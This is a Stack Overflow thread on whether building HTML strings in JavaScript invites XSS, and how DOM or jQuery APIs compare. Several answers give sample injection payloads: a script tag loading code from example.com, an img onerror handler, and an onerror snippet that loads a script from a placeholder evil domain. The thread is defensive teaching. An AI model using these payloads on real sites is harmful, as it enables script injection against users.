<?xml version="1.0" encoding="utf-8"?>
<post><title>Is it really insecure to build HTML strings in Javascript? - Stack Overflow</title><question><text><div class="post-text" itemprop="text">
<p>The company who hosts our site reviews our code before deploying - they've recently told us this:</p>
<blockquote>
<p>HTML strings should never be directly manipulated, as that opens us up
  to potential XSS holes. Instead, always use a DOM api to create
  elements...that can be jQuery or the direct DOM apis.</p>
</blockquote>
<p>For example, instead of</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">this</span><span class="pun">.</span><span class="pln">html</span><span class="pun">.</span><span class="pln">push</span><span class="pun">(</span><span class="pln"> </span><span class="str">'&lt;a class="quiz-au" data-src="'</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> </span><span class="kwd">this</span><span class="pun">.</span><span class="pln">au </span><span class="pun">+</span><span class="pln"> </span><span class="str">'"&gt;&lt;span class="quiz-au-icon"&gt;&lt;/span&gt;Click to play&lt;/a&gt;'</span><span class="pln"> </span><span class="pun">);</span><span class="pln"> </span></code></pre>
<p>They tell us to do</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">var</span><span class="pln"> quizAuLink </span><span class="pun">=</span><span class="pln"> $</span><span class="pun">(</span><span class="pln"> </span><span class="str">'a'</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
quizAuLink</span><span class="pun">.</span><span class="pln">addClass</span><span class="pun">(</span><span class="pln"> </span><span class="str">'quiz-au'</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
quizAuLink</span><span class="pun">.</span><span class="pln">data</span><span class="pun">(</span><span class="pln"> </span><span class="str">'src'</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">this</span><span class="pun">.</span><span class="pln">au </span><span class="pun">);</span><span class="pln">
quizAu</span><span class="pun">.</span><span class="pln">text</span><span class="pun">(</span><span class="pln"> </span><span class="str">'Click to play'</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
quizAu</span><span class="pun">.</span><span class="pln">prepend</span><span class="pun">(</span><span class="pln"> </span><span class="str">'&lt;span class="quiz-au-icon"&gt;&lt;/span&gt;'</span><span class="pln"> </span><span class="pun">);</span></code></pre>
<p>Is this really true? Can anyone give us an example of an XSS attack that could exploit an HTML string like the first one?</p>
</div></text><author><a href="/users/1757964/aperson">APerson</a></author><comments><comment><text><span class="comment-copy">This question seems to be more suited for <a href="http://codereview.stackexchange.com/">codereview.stackexchange.com</a></span></text><author><a class="comment-user" href="/users/212107/gerald-schneider" title="12,187 reputation">Gerald Schneider</a></author></comment><comment><text><span class="comment-copy">@GeraldSchneider No it doesn't.</span></text><author><a class="comment-user" href="/users/3187556/scimonster" title="20,311 reputation">Scimonster</a></author></comment><comment><text><span class="comment-copy">In general, it's probably not necessary. In circumstances where content comes from a user, it may be sensible. So in this case it depends where <code>this.au</code> came from.</span></text><author><a class="comment-user" href="/users/417562/lonesomeday" title="150,591 reputation">lonesomeday</a></author></comment><comment><text><span class="comment-copy">I guess over all that the problem is not what the user tries to inject, but how do you handle the written HTML. You should care about to ensure the injected HTML</span></text><author><a class="comment-user" href="/users/1848833/steo" title="3,153 reputation">steo</a></author></comment><comment><text><span class="comment-copy">I disagree with you @lonesomeday, even if the content doesn't come from the user but from your super trusty database, it's still good practice to handle it with care. Should your database turn out to be not so trusty and have a SQL-injection vulnerability, handling the content it serves with care will limit the damage the SQL-injection can do. As an analogy, would you tell a bank or casino they don't need cameras/alarm systems because the only ones with a key in the first place are all trusted employees? ;)</span></text><author><a class="comment-user" href="/users/2684660/funkwurm" title="3,279 reputation">funkwurm</a></author></comment><comment><text><span class="comment-copy">@funkworm It's a reasonable point. I agree that data from a database needs to be treated with care. But there are secure items of data, e.g. those hard-coded in Javascript.</span></text><author><a class="comment-user" href="/users/417562/lonesomeday" title="150,591 reputation">lonesomeday</a></author></comment><comment><text><span class="comment-copy">I didn't know that <code>$('a')</code> worked as a shortcut for <code>document.createElement('a')</code>. I wonder how high the overhead is?</span></text><author><a class="comment-user" href="/users/209139/trig" title="5,759 reputation">TRiG</a></author></comment><comment><text><span class="comment-copy">@TRiG Actually, i don't think it does. It would be <code>$('&lt;a&gt;')</code>.</span></text><author><a class="comment-user" href="/users/3187556/scimonster" title="20,311 reputation">Scimonster</a></author></comment><comment><text><span class="comment-copy">@GeraldSchneider This question seems to be more suited for security.stackexchange.com</span></text><author><a class="comment-user" href="/users/1827295/alexander" title="10,241 reputation">Alexander</a></author></comment><comment><text><span class="comment-copy">If this is the only thing you use jQuery for, I'd say it's not worth it to import the whole library (as it's around 20-30K). You could do <a href="http://shebang.brandonmintern.com/foolproof-html-escaping-in-javascript/" rel="nofollow noreferrer">something like this</a> instead</span></text><author><a class="comment-user" href="/users/2685386/blgt" title="6,315 reputation">blgt</a></author></comment><comment><text><span class="comment-copy">another obvious error is the use of <code>quizAuLink.data</code>: it will NOT set the src attribute, for that you should use <code>quizAuLink.attr</code> <a href="http://api.jquery.com/data/#data-html5" rel="nofollow noreferrer">api.jquery.com/data/#data-html5</a></span></text><author><a class="comment-user" href="/users/1568684/lordvlad" title="3,115 reputation">lordvlad</a></author></comment><comment><text><span class="comment-copy">@lordvlad: Most of the time, you probably <b>don't</b> want to create the data attribute. Using <code>.data()</code> instead of <code>.attr()</code> is a feature, not a bug.</span></text><author><a class="comment-user" href="/users/309412/lie-ryan" title="37,064 reputation">Lie Ryan</a></author></comment><comment><text><span class="comment-copy">@LieRyan oh, you're right, I only saw 'src' and assumed it MUST be an attribute.. sorry bout that</span></text><author><a class="comment-user" href="/users/1568684/lordvlad" title="3,115 reputation">lordvlad</a></author></comment><comment><text><span class="comment-copy">For lots of examples that get you thinking like a blackhat, see <a href="http://escape.alf.nu" rel="nofollow noreferrer">escape.alf.nu</a></span></text><author><a class="comment-user" href="/users/2770309/pixnbits" title="749 reputation">PixnBits</a></author></comment><comment><text><span class="comment-copy">Thank you, very handy!</span></text><author><a class="comment-user owner" href="/users/678834/and-finally" title="2,514 reputation">And Finally</a></author></comment></comments></question><answers><answer><text><div class="post-text" itemprop="text">
<p>If <code>this.au</code> is somehow modified, it might contain something like this:</p>
<pre class="lang-none prettyprint prettyprinted" style=""><code><span class="pln">"&gt;&lt;script src="http://example.com/evilScript.js"&gt;&lt;/script&gt;&lt;span class="</span></code></pre>
<p>That'll mess up your HTML and inject a script:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="tag">&lt;a</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">"quiz-au"</span><span class="pln"> </span><span class="atn">data-src</span><span class="pun">=</span><span class="atv">""</span><span class="tag">&gt;&lt;script</span><span class="pln"> </span><span class="atn">src</span><span class="pun">=</span><span class="atv">"http://example.com/evilScript.js"</span><span class="tag">&gt;&lt;/script&gt;&lt;span</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">""</span><span class="tag">&gt;&lt;span</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">"quiz-au-icon"</span><span class="tag">&gt;&lt;/span&gt;</span><span class="pln">Click to play</span><span class="tag">&lt;/a&gt;</span></code></pre>
<p>If you use DOM manipulation to set the <code>src</code> attribute, the script (or whatever other XSS you use) won't be executed, as it'll be properly escaped by the DOM API.</p>
<hr/>
<p>In response to some commentators who are saying that if someone could modify <code>this.au</code>, surely they could run the script on their own: I don't know where <code>this.au</code> is coming from, nor is it particularly relevant. It could be a value from the database, and the DB might have been compromised. It could also be a malicious user trying to mess things up for <em>other</em> users. It could even be an innocent non-techie who didn't realize that writing <code>"def" &gt; "abc"</code> would destroy things.</p>
<hr/>
<p>One more thing. In the code you provided, <code>var quizAuLink = $( 'a' );</code> will not create a new <code>&lt;a&gt;</code> element. It'll just select all the existing ones. You need to use <code>var quizAuLink = $( '&lt;a&gt;' );</code> to create a new one.</p>
</div></text><author><a href="/users/3187556/scimonster">Scimonster</a></author><comments><comment><text><span class="comment-copy">+1 for nice injection.</span></text><author><a class="comment-user" href="/users/4169901/edan-feiles" title="445 reputation">Edan Feiles</a></author></comment><comment><text><span class="comment-copy">+1. Almost finished to write exactly the same answer)</span></text><author><a class="comment-user" href="/users/2359859/ivan" title="448 reputation">Ivan</a></author></comment><comment><text><span class="comment-copy">+1 I have learnt something new today. Cheers!</span></text><author><a class="comment-user" href="/users/2315558/david-jones" title="2,636 reputation">David Jones</a></author></comment><comment><text><span class="comment-copy">In all modern browser this will not work though.. <a href="https://stackoverflow.com/questions/1197575/can-scripts-be-inserted-with-innerhtml" title="can scripts be inserted with innerhtml">stackoverflow.com/questions/1197575/…</a></span></text><author><a class="comment-user" href="/users/887539/andlrc" title="31,183 reputation">andlrc</a></author></comment><comment><text><span class="comment-copy">@null It's an example. They might inject some other HTML, or use a handler as you mentioned.</span></text><author><a class="comment-user" href="/users/3187556/scimonster" title="20,311 reputation">Scimonster</a></author></comment><comment><text><span class="comment-copy">Thanks a lot Scimonster, so there is something in it!</span></text><author><a class="comment-user owner" href="/users/678834/and-finally" title="2,514 reputation">And Finally</a></author></comment><comment><text><span class="comment-copy">Damn those example.com bastards. They host all the most malicious files.</span></text><author><a class="comment-user" href="/users/973810/fuser97381" title="2,527 reputation">Fuser97381</a></author></comment><comment><text><span class="comment-copy">Now why exactly is this more unsafe than using DOM methods? If the attacker had the possibility to modify this.au, he/she probably also had the possibility to inject a script element.</span></text><author><a class="comment-user" href="/users/1608468/tomsmeding" title="489 reputation">tomsmeding</a></author></comment><comment><text><span class="comment-copy">@tomsmeding Perhaps <code>this.au</code> came from an untrusted source, say, user input.</span></text><author><a class="comment-user" href="/users/3187556/scimonster" title="20,311 reputation">Scimonster</a></author></comment><comment><text><span class="comment-copy">@Scimonster: And if it didn't.</span></text><author><a class="comment-user" href="/users/560648/boundaryimposition" title="236,453 reputation">BoundaryImposition</a></author></comment><comment><text><span class="comment-copy">@LightnessRacesinOrbit And if the value was guaranteed to be trusted, so then the OP's original method could also work. For example: <code>this.au = Math.random()&lt;0.5 ? '/src1/' : '/src2'</code>. There's no worry of XSS there, so fine. But in other cases, where the security isn't 100% guaranteed, so the DOM building method should be used.</span></text><author><a class="comment-user" href="/users/3187556/scimonster" title="20,311 reputation">Scimonster</a></author></comment><comment><text><span class="comment-copy">@Scimonster Perhaps it was user input; my point is that the web console also accepts user input. Trying to make a secure webpage client-side is like trying to prevent the buyer from building a bulldozer when selling him a lego pack for a race car. You can make it harder, but you can't really prevent anything. The only real security can be built in server-side. — The problem here is not really security, but rather robustness: the point of escaping well is something that is rather left to the built-in browser routines (that work with the DOM api). Same goes for the <code>eval</code>-happening.</span></text><author><a class="comment-user" href="/users/1608468/tomsmeding" title="489 reputation">tomsmeding</a></author></comment><comment><text><span class="comment-copy">@tomsmeding You can't protect users against their own web console use or misuse, but it's not necessarily input from the <i>current</i> user that you're worried about - rather something input by a malicious user which your site will display to potential victims.</span></text><author><a class="comment-user" href="/users/1428461/jacob-raihle" title="3,161 reputation">Jacob Raihle</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p>This should be just as secure, without compromising too much on readability:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">var</span><span class="pln"> link </span><span class="pun">=</span><span class="pln"> $</span><span class="pun">(</span><span class="str">'&lt;a class="quiz-au"&gt;&lt;span class="quiz-au-icon"&gt;&lt;/span&gt;Click to play&lt;/a&gt;'</span><span class="pun">);</span><span class="pln">
link</span><span class="pun">.</span><span class="pln">data</span><span class="pun">(</span><span class="str">"src"</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">this</span><span class="pun">.</span><span class="pln">au</span><span class="pun">);</span></code></pre>
<p>The point is to avoid doing string operations to build HTML strings. Note that in above, I used <code>$()</code> only to parse a constant string, which parses to a well known result. In this example, only the <code>this.au</code> part is dangerous because it may contain dynamically calculated values.</p>
</div></text><author><a href="/users/309412/lie-ryan">Lie Ryan</a></author><comments><comment><text><span class="comment-copy">Just beware though, using <code>.data()</code> doesn't assign it as an attribute, and it's possible that the OP needs it as an attribute. Of course, it's also possible that this way is fine.</span></text><author><a class="comment-user" href="/users/3187556/scimonster" title="20,311 reputation">Scimonster</a></author></comment></comments></answer><answer><text><div class="post-text" itemprop="text">
<p>As you cannot inject script tags in modern browsers using <code>.innerHTML</code> you will need to listen to an event:</p>
<p>If <code>this.au</code> is somehow modified, it might contain something like this:</p>
<pre class="lang-none prettyprint prettyprinted" style=""><code><span class="pln">"&gt;&lt;img src="broken-path.png" onerror="alert('my injection');"&gt;&lt;span class="</span></code></pre>
<p>That'll mess up your HTML and inject a script:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="tag">&lt;a</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">"quiz-au"</span><span class="pln"> </span><span class="atn">data-src</span><span class="pun">=</span><span class="atv">""</span><span class="tag">&gt;&lt;img</span><span class="pln"> </span><span class="atn">src</span><span class="pun">=</span><span class="atv">"broken-path.png"</span><span class="pln"> </span><span class="atn">onload</span><span class="pun">=</span><span class="atv">"</span><span class="pln">alert</span><span class="pun">(</span><span class="str">'my injection'</span><span class="pun">)</span><span class="atv">"</span><span class="tag">&gt;&lt;span</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">""</span><span class="tag">&gt;&lt;span</span><span class="pln"> </span><span class="atn">class</span><span class="pun">=</span><span class="atv">"quiz-au-icon"</span><span class="tag">&gt;&lt;/span&gt;</span><span class="pln">Click to play</span><span class="tag">&lt;/a&gt;</span></code></pre>
<p>And ofcause to run bigger chunks of JavaScript set onerror to:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">var</span><span class="pln"> d </span><span class="pun">=</span><span class="pln"> document</span><span class="pun">;</span><span class="pln"> s </span><span class="pun">=</span><span class="pln"> d</span><span class="pun">.</span><span class="pln">createElement</span><span class="pun">(</span><span class="str">'script'</span><span class="pun">);</span><span class="pln"> s</span><span class="pun">.</span><span class="pln">type</span><span class="pun">=</span><span class="str">'text/javascript'</span><span class="pun">;</span><span class="pln"> s</span><span class="pun">.</span><span class="pln">src </span><span class="pun">=</span><span class="pln"> </span><span class="str">'www.my-evil-path.com'</span><span class="pun">;</span><span class="pln"> d</span><span class="pun">.</span><span class="pln">body</span><span class="pun">.</span><span class="pln">appendChild</span><span class="pun">(</span><span class="pln">s</span><span class="pun">);</span></code></pre>
<p>Thanks to Scimoster for the boilerplate </p>
</div></text><author><a href="/users/887539/andlrc">andlrc</a></author><comments/></answer><answer><text><div class="post-text" itemprop="text">
<p>Security aside, when you build HTML in JavaScript you must make sure that it is valid. While it is possible to build and sanitize HTML by string manipulation*, DOM manipulation is far more convenient. Still, you must know exactly which part of your string is HTML and which is literal text.</p>
<p>Consider the following example where we have two hard-coded variables:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">var</span><span class="pln"> href </span><span class="pun">=</span><span class="pln"> </span><span class="str">"/detail?tag=hr&amp;copy%5B%5D=1"</span><span class="pun">,</span><span class="pln">
    text </span><span class="pun">=</span><span class="pln"> </span><span class="str">"The HTML &lt;hr&gt; tag"</span><span class="pun">;</span></code></pre>
<p>The following code naively builds the HTML string:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">var</span><span class="pln"> div </span><span class="pun">=</span><span class="pln"> document</span><span class="pun">.</span><span class="pln">createElement</span><span class="pun">(</span><span class="str">"div"</span><span class="pun">);</span><span class="pln">
div</span><span class="pun">.</span><span class="pln">innerHTML </span><span class="pun">=</span><span class="pln"> </span><span class="str">'&lt;a href="'</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> href </span><span class="pun">+</span><span class="pln"> </span><span class="str">'"&gt;'</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> text </span><span class="pun">+</span><span class="pln"> </span><span class="str">'&lt;/a&gt;'</span><span class="pun">;</span><span class="pln">
console</span><span class="pun">.</span><span class="pln">log</span><span class="pun">(</span><span class="pln">div</span><span class="pun">.</span><span class="pln">innerHTML</span><span class="pun">);</span><span class="pln">
</span><span class="com">// &lt;a href="/detail?tag=hr©%5B%5D=1"&gt;The HTML &lt;hr&gt; tag&lt;/a&gt;</span></code></pre>
<p>This uses jQuery but it is still incorrect (it uses <code>.html()</code> on a <em>variable that was supposed to be text</em>):</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">var</span><span class="pln"> div </span><span class="pun">=</span><span class="pln"> document</span><span class="pun">.</span><span class="pln">createElement</span><span class="pun">(</span><span class="str">"div"</span><span class="pun">);</span><span class="pln">
$</span><span class="pun">(</span><span class="str">"&lt;a&gt;&lt;/a&gt;"</span><span class="pun">).</span><span class="pln">attr</span><span class="pun">(</span><span class="str">"href"</span><span class="pun">,</span><span class="pln"> href</span><span class="pun">).</span><span class="pln">html</span><span class="pun">(</span><span class="pln">text</span><span class="pun">).</span><span class="pln">appendTo</span><span class="pun">(</span><span class="pln">div</span><span class="pun">);</span><span class="pln">
console</span><span class="pun">.</span><span class="pln">log</span><span class="pun">(</span><span class="pln">div</span><span class="pun">.</span><span class="pln">innerHTML</span><span class="pun">);</span><span class="pln">
</span><span class="com">// &lt;a href="/detail?tag=hr&amp;amp;copy%5B%5D=1"&gt;The HTML &lt;hr&gt; tag&lt;/a&gt;</span></code></pre>
<p>This is correct because <em>it displays the text as intended</em>:</p>
<pre class="default prettyprint prettyprinted" style=""><code><span class="kwd">var</span><span class="pln"> div </span><span class="pun">=</span><span class="pln"> document</span><span class="pun">.</span><span class="pln">createElement</span><span class="pun">(</span><span class="str">"div"</span><span class="pun">);</span><span class="pln">
$</span><span class="pun">(</span><span class="str">"&lt;a&gt;&lt;/a&gt;"</span><span class="pun">).</span><span class="pln">attr</span><span class="pun">(</span><span class="str">"href"</span><span class="pun">,</span><span class="pln"> href</span><span class="pun">).</span><span class="pln">text</span><span class="pun">(</span><span class="pln">text</span><span class="pun">).</span><span class="pln">appendTo</span><span class="pun">(</span><span class="pln">div</span><span class="pun">);</span><span class="pln">
console</span><span class="pun">.</span><span class="pln">log</span><span class="pun">(</span><span class="pln">div</span><span class="pun">.</span><span class="pln">innerHTML</span><span class="pun">);</span><span class="pln">
</span><span class="com">// &lt;a href="/detail?tag=hr&amp;amp;copy%5B%5D=1"&gt;The HTML &amp;lt;hr&amp;gt; tag&lt;/a&gt;</span></code></pre>
<p>Conclusion: Using DOM manipulation/jQuery do not guarantee any security, but it sure is one step in right direction.</p>
<hr/>
<p>* See <a href="http://stackoverflow.com/q/24816/87015">this question for examples</a>. Both string and DOM manipulation are discussed.</p>
</div></text><author><a href="/users/87015/salman-a">Salman A</a></author><comments><comment><text><span class="comment-copy">The 2 last blocks of code looks very similar, I had too look carefully to see the difference, can you please emphasize that they use <code>html()</code> and <code>text()</code>?</span></text><author><a class="comment-user" href="/users/2257664/a-l" title="5,576 reputation">A.L</a></author></comment></comments></answer></answers></post>